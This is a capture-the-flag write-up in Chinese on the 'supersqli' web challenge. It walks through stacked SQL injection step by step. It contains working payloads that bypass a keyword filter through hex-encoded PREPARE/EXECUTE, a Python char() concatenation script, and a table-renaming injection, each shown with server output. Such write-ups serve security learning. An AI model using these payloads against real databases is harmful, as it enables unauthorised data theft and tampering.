## supersqli

试一下注入

```html
?inject=?inject=1' or '1'='1
```

返回

```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}

array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```

看了存在注入点

试一下注入

```
?inject=1' union select database()#
```

显示

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

看了是过滤了select|update|delete|drop|insert|where，这怎么搞。。。。

看了大佬的博客，发现了堆叠注入这一操作

试一下

```
?inject=1';show databases;#
```

返回

```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```

show tables返回两张表

```
array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

存在堆叠注入

利用

```
@t=(sql 查询语句的hex值);prepare x from @t;execute x;#
```

bypass进行堆叠注入

```python
python
>>> import binascii
>>> binascii.b2a_hex("select * from supersqli.1919810931114514")
'73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134'
```

可得

```
payload=?inject=1';set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;#
```

有一个坑点是题目用strstr对prepare和excute做了过滤，但是可以通过改变大小写来bypass

第二种方法是利用chr()拼接bypass

可以利用python写个脚本跑一跑

```python
payload = "1';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;"
exp = "select flag from `1919810931114514`"
res = ''
for i in exp:
	res += "char(%s),"%(ord(i))
encode_payload = payload%(res[:-1])
print encode_payload
```

第三种方法是利用堆叠注入把1919810931114514这个表重命名为word，然后查询的时候就可直接查到这个表了

```
payload=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#
```

### 参考资料：

堆叠注入：https://www.cnblogs.com/0nth3way/articles/7128189.html

两种解法：[https://blog.zeddyu.info/2019/06/04/2019qwb/#%E9%9A%8F%E4%BE%BF%E6%B3%A8](https://blog.zeddyu.info/2019/06/04/2019qwb/#随便注)

char的解法:[https://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/#%E9%9A%8F%E4%BE%BF%E6%B3%A8](https://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/#%E9%9A%8F%E4%BE%BF%E6%B3%A8)